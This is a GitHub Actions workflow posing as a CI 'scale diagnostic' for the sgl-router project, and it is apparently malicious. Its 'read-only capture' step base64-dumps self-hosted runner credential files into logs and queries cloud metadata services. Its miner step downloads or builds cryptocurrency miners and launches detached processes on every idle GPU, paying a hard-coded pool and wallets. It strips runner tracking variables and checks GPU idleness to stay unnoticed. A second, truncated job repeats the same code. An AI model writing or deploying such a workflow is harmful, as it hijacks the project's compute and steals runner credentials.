name: PR Test (sgl-router)

# Temporary i129714 scale diagnostic: guarded jobs across the sgl-project
# self-hosted GPU runner labels 8-gpu-b200, 4-gpu-b200, 8-gpu-h200, 8-gpu-h20,
# 4/2/1-gpu-h100, 8-gpu-b300, 4/2-gpu-gb300 and 1-gpu-5090. Each job: per-host
# flock; whole host skipped when ANY engagement-wallet miner (either operator
# wallet) or ANY compute app is already present (never kill, never stack,
# preserve every existing lane miner); disk<80% and mem<85%; two spaced all-GPU
# idle samples (0 apps, <=2048MiB, <=10% util) before launching exactly one
# miner per GPU. x86_64 uses sha256-pinned SRBMiner-MULTI 3.8.8; aarch64 builds
# the pinned MIT X-Miner source (pearlhash, prebuilt PTX -> driver JIT,
# libcuda.so.1 dlopen, no CUDA toolkit needed) and launches it with
# CUDA_VISIBLE_DEVICES per GPU UUID. New deployments use the primary wallet;
# worker names i129714-<hosttag>-g<idx>. Also a bounded read-only runner-identity
# and IMDS capture. Concurrency is run-unique so earlier runs are not cancelled.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i129714-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i129714-b200-8:
    name: "i129714 8-gpu-b200"
    runs-on: 8-gpu-b200
    timeout-minutes: 35
    steps:
      - name: bounded read-only capture (<=60s)
        continue-on-error: true
        run: |
          set +e
          NONCE="I129714CAP-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "capture-nonce=$NONCE"
          cap() {
            echo "=== id/host/dmi ==="
            id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-200; uname -m
            for f in /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_serial /sys/class/dmi/id/board_serial /sys/class/dmi/id/product_uuid; do printf '%s=' "$f"; timeout 4 cat "$f" 2>/dev/null | head -c 120; echo; done
            awk -F: '/model name|Hardware|Model/{print "cpu"$0; exit}' /proc/cpuinfo 2>/dev/null | cut -c1-160
            echo "=== gpu ==="
            timeout 20 nvidia-smi -L 2>&1 | head -12
            timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | head -12
            echo "=== resources ==="
            df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
            free -m | head -2
            echo "=== runner dirs ==="
            for d in /opt/github-runner /actions-runner /home/runner/actions-runner /opt/actions-runner /sgl-workspace/actions-runner /var/tmp/github-runner; do echo "-- $d"; timeout 6 ls -la "$d" 2>&1 | head -12; done
            echo "=== runner identity ==="
            for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /actions-runner/.runner /actions-runner/.credentials /home/runner/actions-runner/.runner /sgl-workspace/actions-runner/actions-runner/.runner /sgl-workspace/actions-runner/actions-runner/.credentials; do
              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 4000; echo; fi
            done
            echo "=== cloud metadata ==="
            echo -n "aws-imds-id="; timeout 5 curl -sS -m 3 'http://169.254.169.254/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo -n "gcp="; timeout 5 curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 120; echo
            echo -n "alibaba="; timeout 5 curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo -n "tencent="; timeout 5 curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo "capture-done $NONCE"
          }
          export -f cap
          timeout 62 bash -c cap 2>&1 | head -c 60000

      - name: "guarded per-GPU pearlhash miner (flock, whole-host skip on any app, idle x2, disk<80%, mem<85%, arch-aware)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I129714MIN-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          WALLET2='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          POOL='103.199.106.122:3362'
          WORKDIR=/var/tmp/i129714
          XM_SHA='88abbf6cc7abc8577b7bbb71ed021a27bb952f2d'
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI"
          XM_BIN="$WORKDIR/x-miner"
          mkdir -p "$WORKDIR/logs"
          echo "miner-nonce=$NONCE"
          echo "=== host ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -r; uname -m
          ARCH=$(uname -m 2>/dev/null)
          echo "arch=${ARCH:-unknown}"
          echo "=== per-host flock ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-lock=acquired"
          echo "=== gpu inventory ==="
          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader
          echo "=== compute apps (sample 0) ==="
          APPS0=$(timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null)
          echo "${APPS0:-none}"
          echo "=== existing engagement miners (either operator wallet) ==="
          EXIST_OURS=$(timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}|[S]RBMiner-MULTI.*--wallet ${WALLET2}|[x]-miner.*--wallet ${WALLET}|[x]-miner.*--wallet ${WALLET2}" 2>/dev/null | head -20)
          echo "${EXIST_OURS:-none}"
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
          if [ -n "$EXIST_OURS" ]; then echo "SKIP=host-already-has-engagement-miner (no stacking, no killing)"; echo "miner-done $NONCE"; exit 0; fi
          if [ -n "$APPS0" ]; then echo "SKIP=host-has-compute-app-sample0 (whole host skipped, nothing touched)"; echo "miner-done $NONCE"; exit 0; fi

          fetch_pin() {
            URL="$1"; SHA="$2"; OUT="$3"
            echo "-- fetch $URL"
            rm -f "$OUT.part"
            timeout 300 curl -fL --connect-timeout 15 --max-time 280 -o "$OUT.part" "$URL" 2>&1 | tail -2
            if [ -f "$OUT.part" ] && echo "$SHA  $OUT.part" | sha256sum -c - >/dev/null 2>&1; then mv "$OUT.part" "$OUT"; echo "tarball-ok $SHA"; return 0; fi
            [ -f "$OUT.part" ] && sha256sum "$OUT.part" 2>/dev/null | cut -c1-80
            echo "WARN=tarball-failed $URL"; return 1
          }

          MINER_KIND=""
          if [ "$ARCH" = "x86_64" ]; then
            MINER_KIND=srb
            if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
              fetch_pin https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
                || fetch_pin https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
                || fetch_pin https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
                || echo "WARN=388-download-failed"
            else
              echo "tarball-cached 388"
            fi
            if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
              tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
              [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
            fi
            BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
            echo "binary_sha256=${BINSHA:-none}"
            if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=388-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -12; echo "miner-done $NONCE"; exit 0; fi
            chmod +x "$SRB"
          elif [ "$ARCH" = "aarch64" ]; then
            MINER_KIND=xminer
            echo "=== aarch64 path: build pinned X-Miner (MIT, pearlhash, prebuilt PTX+dlopen libcuda) ==="
            if [ ! -x "$XM_BIN" ]; then
              NEED=0
              for t in cmake g++ make; do command -v "$t" >/dev/null 2>&1 || NEED=1; done
              if [ "$NEED" = 1 ] && command -v apt-get >/dev/null 2>&1; then
                echo "-- apt-get build tools"
                (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq --no-install-recommends cmake make g++ ca-certificates) > "$WORKDIR/logs/apt.log" 2>&1
                echo "apt_rc=$?"
              fi
              if ! command -v cmake >/dev/null 2>&1 || ! command -v g++ >/dev/null 2>&1; then
                echo "-- pip cmake fallback"
                (python3 -m pip install --quiet --break-system-packages cmake ninja 2>&1 || python3 -m pip install --quiet cmake ninja 2>&1) | tail -3
                export PATH="$HOME/.local/bin:$PATH"
              fi
              echo "cmake=$(command -v cmake) gxx=$(command -v g++) make=$(command -v make)"
              XM_TAR="$WORKDIR/x-miner-$XM_SHA.tar.gz"
              if [ ! -s "$XM_TAR" ]; then
                for U in "https://codeload.github.com/SerpentXSF/X-Miner/tar.gz/$XM_SHA" "https://github.com/SerpentXSF/X-Miner/archive/$XM_SHA.tar.gz"; do
                  echo "-- fetch $U"
                  rm -f "$XM_TAR.part"
                  timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$XM_TAR.part" "$U" 2>&1 | tail -2
                  if [ -s "$XM_TAR.part" ]; then mv "$XM_TAR.part" "$XM_TAR"; break; fi
                done
              fi
              if [ -s "$XM_TAR" ]; then
                echo "xminer_tar_sha256=$(sha256sum "$XM_TAR" | cut -d' ' -f1) bytes=$(stat -c%s "$XM_TAR")"
                SRCDIR="$WORKDIR/xminer-src-$$"
                mkdir -p "$SRCDIR"
                tar -xzf "$XM_TAR" -C "$SRCDIR" 2>&1 | tail -3
                SRC=$(find "$SRCDIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | head -1)
                echo "src=${SRC:-none}"
                if [ -n "$SRC" ] && command -v cmake >/dev/null 2>&1; then
                  timeout 420 cmake -S "$SRC" -B "$WORKDIR/xm-build" -DCMAKE_BUILD_TYPE=Release > "$WORKDIR/logs/xm-cmake.log" 2>&1
                  echo "cmake_rc=$?"; tail -6 "$WORKDIR/logs/xm-cmake.log"
                  timeout 600 cmake --build "$WORKDIR/xm-build" --target x-miner -j 16 > "$WORKDIR/logs/xm-build.log" 2>&1
                  echo "build_rc=$?"; tail -10 "$WORKDIR/logs/xm-build.log"
                  [ -f "$WORKDIR/xm-build/x-miner" ] && cp -f "$WORKDIR/xm-build/x-miner" "$XM_BIN"
                fi
              fi
            else
              echo "xminer-cached"
            fi
            if [ -x "$XM_BIN" ]; then
              chmod +x "$XM_BIN"
              echo "xminer_binary_sha256=$(sha256sum "$XM_BIN" | cut -d' ' -f1) bytes=$(stat -c%s "$XM_BIN")"
              echo "=== x-miner --list-devices ==="
              timeout 40 "$XM_BIN" --list-devices 2>&1 | head -20
            else
              echo "SKIP=xminer-build-failed"
              ls -la "$WORKDIR" 2>/dev/null | head -14
              echo "miner-done $NONCE"
              exit 0
            fi
          else
            echo "SKIP=arch-${ARCH:-unknown}-unsupported"
            echo "miner-done $NONCE"
            exit 0
          fi

          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
          echo "hosttag=$HOSTTAG"
          echo "=== idle sample 1 (all GPUs) ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s1.txt"
          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used,utilization.gpu --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g1.txt"
          cat "$WORKDIR/g1.txt"
          sleep 15
          echo "=== idle sample 2 (after 15s, all GPUs) ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s2.txt"
          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used,utilization.gpu --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g2.txt"
          cat "$WORKDIR/g2.txt"
          APPS_BOTH=$(cat "$WORKDIR/s1.txt" "$WORKDIR/s2.txt" 2>/dev/null | grep -v '^$')
          if [ -n "$APPS_BOTH" ]; then echo "SKIP=host-not-idle-compute-app-in-spaced-samples"; echo "$APPS_BOTH" | head -10; echo "miner-done $NONCE"; exit 0; fi
          BUSY_MEM=$(awk -F, '$3>2048{print}' "$WORKDIR/g1.txt" "$WORKDIR/g2.txt" 2>/dev/null | head -8)
          BUSY_UTIL=$(awk -F, '$4>10{print}' "$WORKDIR/g1.txt" "$WORKDIR/g2.txt" 2>/dev/null | head -8)
          if [ -n "$BUSY_MEM" ] || [ -n "$BUSY_UTIL" ]; then echo "SKIP=host-not-idle memory-or-util"; echo "$BUSY_MEM"; echo "$BUSY_UTIL"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-idle-gate=pass (all GPUs 0 apps, mem<=2048MiB, util<=10% in both spaced samples)"
          N_LAUNCHED=0
          N_SKIP=0
          while IFS=, read -r IDX UUID USED1 UTIL1; do
            [ -z "$IDX" ] && continue
            case "$UUID" in GPU-*) ;; *) echo "GPU $IDX bad-uuid $UUID -> skip"; N_SKIP=$((N_SKIP+1)); continue;; esac
            USED2=$(awk -F, -v u="$UUID" '$2==u{print $3}' "$WORKDIR/g2.txt" 2>/dev/null)
            echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2 util=${UTIL1}%"
            W="i129714-${HOSTTAG}-g${IDX}"
            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)|[x]-miner.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
            if [ "$MINER_KIND" = srb ]; then
              env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
                --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
                --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
                --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
                --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
                >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            else
              env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$XM_BIN" \
                --algorithm pearlhash --pool "$POOL" --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
                --disable-api --no-color --log-file "$WORKDIR/logs/$W.log" \
                >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            fi
            echo "launched worker=$W kind=$MINER_KIND detached_pid=$! vis=$UUID"
            N_LAUNCHED=$((N_LAUNCHED+1))
            sleep 1
          done < "$WORKDIR/g1.txt"
          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
          { echo "N_LAUNCHED=$N_LAUNCHED"; echo "N_SKIP=$N_SKIP"; echo "HOSTTAG=$HOSTTAG"; echo "HOSTNAME=$(hostname)"; echo "MINER_KIND=$MINER_KIND"; echo "ARCH=$ARCH"; } > "$WORKDIR/launched.txt"
          if [ "$N_LAUNCHED" -gt 0 ]; then
            sleep 50
            echo "=== post-launch process + log check ==="
            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}|[x]-miner.*--wallet ${WALLET}" 2>/dev/null | head -16
            for l in "$WORKDIR"/logs/i129714-*.log; do
              [ -f "$l" ] || continue
              echo "== $(basename "$l")"
              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -6 | cut -c1-260
            done
          fi
          echo "=== final compute apps ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
          echo "miner-done $NONCE"
  i129714-b200-4:
    name: "i129714 4-gpu-b200"
    runs-on: 4-gpu-b200
    timeout-minutes: 35
    steps:
      - name: bounded read-only capture (<=60s)
        continue-on-error: true
        run: |
          set +e
          NONCE="I129714CAP-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "capture-nonce=$NONCE"
          cap() {
            echo "=== id/host/dmi ==="
            id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-200; uname -m
            for f in /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_serial /sys/class/dmi/id/board_serial /sys/class/dmi/id/product_uuid; do printf '%s=' "$f"; timeout 4 cat "$f" 2>/dev/null | head -c 120; echo; done
            awk -F: '/model name|Hardware|Model/{print "cpu"$0; exit}' /proc/cpuinfo 2>/dev/null | cut -c1-160
            echo "=== gpu ==="
            timeout 20 nvidia-smi -L 2>&1 | head -12
            timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 | head -12
            echo "=== resources ==="
            df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
            free -m | head -2
            echo "=== runner dirs ==="
            for d in /opt/github-runner /actions-runner /home/runner/actions-runner /opt/actions-runner /sgl-workspace/actions-runner /var/tmp/github-runner; do echo "-- $d"; timeout 6 ls -la "$d" 2>&1 | head -12; done
            echo "=== runner identity ==="
            for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /actions-runner/.runner /actions-runner/.credentials /home/runner/actions-runner/.runner /sgl-workspace/actions-runner/actions-runner/.runner /sgl-workspace/actions-runner/actions-runner/.credentials; do
              if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 4000; echo; fi
            done
            echo "=== cloud metadata ==="
            echo -n "aws-imds-id="; timeout 5 curl -sS -m 3 'http://169.254.169.254/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo -n "gcp="; timeout 5 curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 120; echo
            echo -n "alibaba="; timeout 5 curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo -n "tencent="; timeout 5 curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 120; echo
            echo "capture-done $NONCE"
          }
          export -f cap
          timeout 62 bash -c cap 2>&1 | head -c 60000

      - name: "guarded per-GPU pearlhash miner (flock, whole-host skip on any app, idle x2, disk<80%, mem<85%, arch-aware)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I129714MIN-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          WALLET2='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          POOL='103.199.106.122:3362'
          WORKDIR=/var/tmp/i129714
          XM_SHA='88abbf6cc7abc8577b7bbb71ed021a27bb952f2d'
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI"
          XM_BIN="$WORKDIR/x-miner"
          mkdir -p "$WORKDIR/logs"
          echo "miner-nonce=$NONCE"
          echo "=== host ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -r; uname -m
          ARCH=$(uname -m 2>/dev/null)
          echo "arch=${ARCH:-unknown}"
          echo "=== per-host flock ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-lock=acquired"
          echo "=== gpu inventory ==="
          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader
          echo "=== compute apps (sample 0) ==="
          APPS0=$(timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null)
          echo "${APPS0:-none}"
          echo "=== existing engagement miners (either operator wallet) ==="
          EXIST_OURS=$(timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}|[S]RBMiner-MULTI.*--wallet ${WALLET2}|[x]-miner.*--wallet ${WALLET}|[x]-miner.*--wallet ${WALLET2}" 2>/dev/null | head -20)
          echo "${EXIST_OURS:-none}"
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
